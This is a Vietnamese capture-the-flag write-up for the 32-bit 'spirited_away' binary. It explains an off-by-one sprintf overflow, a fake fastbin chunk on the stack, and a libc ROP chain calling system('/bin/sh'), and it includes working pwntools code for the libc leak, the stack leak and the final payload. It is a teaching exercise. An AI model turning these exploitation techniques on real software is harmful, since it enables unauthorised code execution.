# OFF BY ONE 

Ta được cung cấp 2 file là libc_32.so.6 và spirited_away.Cùng kiểm tra các chế độ bảo vệ của file binary :

![image](https://user-images.githubusercontent.com/93699926/235692312-76f954e9-28f5-4f86-bf4b-05db0fbb5290.png)

đây là file32bit cùng các chế độ bảo vệ chỉ được bật duy nhất NX.OK giờ thì kiểm tra luồng thực thi của chương trình trong IDA:

Chúng ta sẽ chỉ quan tâm đến func survey:

![image](https://user-images.githubusercontent.com/93699926/235693225-2e53555d-d0f3-42e1-9e71-4a4d0f77d445.png)

![image](https://user-images.githubusercontent.com/93699926/235693342-cfc209af-18db-4626-8cf6-f425fafbe70a.png)

Xác định lỗi :

![image](https://user-images.githubusercontent.com/93699926/235699108-21654a43-ee43-4e6a-a03b-4b55741ff45a.png)

Ở đây ta thấy chương trình sẽ copy "%d comment so far. We will review them as soon as we can" vô viến char v1[56] . sẽ không có điều gì xảy ra khi chuỗi nãy khi %d <= 2 chữ số .nhưng nếu ta chạy chương trình đến
 lần khảo sat thứ 100 thì string "%d comment so far. We will review them as soon as we can" sẽ lên đến 57 bytes và sẽ tràn 1 bytes "n" xuống variable được khai báo ngay dưới v1 là name_size và nếu đổi 'n' ra số ascii thi sẽ = 110
 
 Tức là ở lần nhập khảo sat thứ 100 ta sẽ có lỗi buffer over flow . Cụ thể là khi chúng ta được nhập vô comment[80]. Và để ý bên dưới biến comment sẽ là biến age và ngay sau đó là con trỏ name.
 phân tích chương trình ta thấy con trỏ name sẽ trỏ đến địa chỉ heap có (size=0x41). và địa chỉ này sẽ được free mỗi khi ta kết thúc 1 lần khảo sát .
 
 Vậy ý tưởng khai thác ở đây sẽ là:
 
 `Bước 1: leak địa chỉ libc`
 
 `Bước 2: over write địa chỉ của một hàm khác VD: puts hoặc printf thành system `
 
để thực hiện ý tưởng này thì ta cần phải over write địa chỉ của name thânh một địa chỉ nào đó (tạo một fake chunks với size 0x41) gần với dịa chỉ của function mà ta muốn overwrite thành system 
Nhưng khó là nó nó cần tìm được vị trí nào đó đáp ứng đúng yêu cầu về heap metadata phù hợp . nếu không chương trình sẽ bị abort.

Vậy nên ta sẽ thay ý tưởng overwrite địa của một hàm nào đó thành overwrite địa chỉ trả về của hàm survey. Làm thế này sẽ dễ hơn trong việc tạo fakechunk khi mà ta để ý thì chương trình không có canary.và khi mà ta được ta ghi trực tiếp ghi lên stack thì sẽ dễ tạo ra fake metadata và fake topchunk size hơn . hai cái này là bắt buộc cần có để không bị lỗi khi chúng ta free name.
. Để thực hiện ý tưởng thì ta cần leak cả địa chỉ stack ra nữa. ok vậy thì ý tưởng cuối cùng sẽ là :

`Bước 1: leak địa chỉ libc`

`Bước 2: leak stack address`

`Bước 3: over write địa chỉ trả về của survey`

# Bước 1: leak libc address 

Ta hãy chạy chương trình với GDB và b \* 0x804878a
địa chỉ ở câu lệnh printf in ra biến reason ta đã nhập trươc đó:

![image](https://user-images.githubusercontent.com/93699926/235700545-59bac901-f973-47e3-bfbe-3dec63e273f9.png)

địa chỉ của biến reason ở vị trí $RSP+0xa8. Ta thấy trên stack có khá nhiều địa chỉ rác là địac chỉ libc . nên nếu ta nối phần input của ta với một trong những địa chỉ trên thì sẽ leak được địa chỉ libc.
lúc đầu mình có chọn một địa chỉ ở gần với biến reason nhưng khi chạy trên sever thì địa chỉ libc base bị tính sai. sau khi thử hết thì có hai địa chỉ uy tín là 0xfffa4f38 và 0xfffa4f54 
. leak libc address ở hai địa chỉ stack này ra thì ta sẽ tính được libc base đúng còn những địa chỉ khác thì có vẻ là khi chạy chường trình trên sever sẽ khác với khi chạy ở LOCAL.

Đoạn code sau sẽ dùng để leak địa chỉ libc và tính libc base:

```python3
name=b"BATMAN"
age=19
payload=b"B"*50
p.sendlineafter(b"name: ",name)
p.sendlineafter(b"age: ",f"{age}".encode())
p.sendafter(b"movie? ",b"A"*73)
p.sendafter(b"comment: ",payload)
p.recvuntil(b"A"*72)
leak=int.from_bytes(p.recv(4),"little")
log.info("[+]leak:"+hex(leak))
libc.address=leak-0x1b0041
log.info('[+]libc base:'+hex(libc.address))
```

Tiếp theo là leak đia chỉ stack:

Để ý ở địa chỉ RBP có chứa địa chỉ stack, vậy nếu ta nhập full 80 bytes của biến reason thì sẽ có thể leak được địac chỉ stack đó ra :

```python3
name=b"BATMAN"
age=19
payload=b"B"*50
reason=b"C"*80
p.sendlineafter(b" <y/n>: ",b"y")
p.sendlineafter(b"name: ",name)
p.sendlineafter(b"age: ",f"{age}".encode())
p.sendafter(b"movie? ",reason)
p.sendafter(b"comment: ",payload)
p.recvuntil(b"C"*80)
leak=int.from_bytes(p.recv(4),"little")
log.info("[+]stack leak:"+hex(leak))
fakechunk=leak-0x60
log.info('[+]fake chunk address:'+hex(fakechunk))
```



và bây giờ để có thể tạo ra lỗi off by one thì ta sẽ cần hoàn thành cái survey them 98 lần nữa :

```python3 
def survey(name,age,comment):
    p.sendlineafter(b" <y/n>: ",b"y")
    p.sendlineafter(b"name: ",name)
    p.sendlineafter(b"age: ",f"{age}".encode())
    p.sendlineafter(b"movie? ",b"A")
    p.sendlineafter(b"comment: ",comment)
for i in range(99):
    print(f"lan{i}")
    survey(name,age,payload)
```

Hãy nhớ lại lúc ở trên . Chúng ta sẽ muốn tạo ra một fakechunks có vị trí ở gần với saved rip của survey . Và sẽ over write name với địa chỉ chỉ đến chunk đó(địa chỉ chunk khong tính phần metadata)
.Và trên stack thì địa chỉ gần với địa chỉ saved rip của survey nhất là comment. vậy ta sẽ sử dụng lần nhập ở tương ứng với comment ở lần nhập tiếp theo để tạo ra một fakechunk
chunk đó sẽ như sau :
```java
metadata: 0x00000000 0x00000041
content : 0x41414141 0x41414141
...     : (padding A*0x38)
Topchunk: 0x00000000 <size of topchunk>
//top chunk size thì bạn cứ chạy thử chương trình trong gdb xong chọn một cái ứng với lần chạy đó là được 
```
sau đó với lỗi buffer overflow như đã phân tích . ta sẽ sử dụng lõi BOF khi nhập comment và sẽ ghi đè biến name trỏ đến địa chỉ chứ content của fakechunk ta đã tạo ra trước đó .
Vì đã ta leak được địa chỉ libc thì ta sẽ có thể tính được địa chỉ content của fakechunks của chúng ta một cách dễ dàng 
.Stack sẽ trông như này sau khi chúng ta thực hiện các điều trên :

![image](https://user-images.githubusercontent.com/93699926/235708216-98a8daaf-8983-493d-829c-7230ec7f7ae3.png)

Tại địa chỉ $RSP +0xa4 chính là biến name của chúng ta , như chúng ta thấy thì nó đã bị thay đổi giá trị thay vì trỏ đến địa chỉ heap thì nó đang chỉ đến địa chỉ stack chứa content của fake chunk của chúng ta  
.Hai địa chỉ trong ô vuông đỏ lần lượt là giá trị của metadata của fakechunk và fake topchunks size của của chúng ta.

Vậy giờ sau khi kết thúc lần khảo sát này . chương trình sẽ free cái fake chunk của chúng ta , nó sẽ vô fastbin, và khi chúng ta thực hiện điền kháo sat một lần nữa thì chương trình sẽ sử dụng lại chính cái fake chunk mà nó đã free trước đó.
và vì khi nhập name ta được nhập đến 110 byte (tương ứng với name_size đã bị ghi đè bởi giá trị của byte 'n' trước đó ).

![image](https://user-images.githubusercontent.com/93699926/235709500-05274fe7-0f53-4dff-a33d-9ba9a98c77d6.png)

thực hiện phép tính thì ta có thể ghi đến tận địa chỉ 0xffb25f06, quá dư giả để thực hiện ROPCHAIN gọi system('/bin/sh') ngay tại rip của survey 

```python3
log.info("[+]ROPPING:")
#### ROPPING########################
p.sendline(b"y")


pop_edi=libc.address+0x000177db
ret=libc.address+0x0000018b
rw_section=0x804aa00
name=b"A"*64+p32(rw_section)
name+=flat(
    libc.sym['system'],
    exe.sym['main'],
    next(libc.search(b"/bin/sh")),
    0,0,
    )
p.sendafter(b"name: ",name)
reason=b"C"*80
p.sendafter(b"movie? ",reason)
payload=b"B"*84
p.sendlineafter(b"comment: ",payload)

p.sendlineafter(b" <y/n>: ",b"n") # trigger survey to return 
```
Chạy trương trình trên LOCAL ta có như sau:

![image](https://user-images.githubusercontent.com/93699926/235710315-3cd27d45-086d-4f98-aa0d-9c1619a9cbee.png)

Chạy trên sever sẽ lâu hơn một chút ,Nhưng đợi chờ là hạnh phúc:

![image](https://user-images.githubusercontent.com/93699926/235711362-b5119550-cfc3-4de1-874f-a8c8fd55d347.png)





 
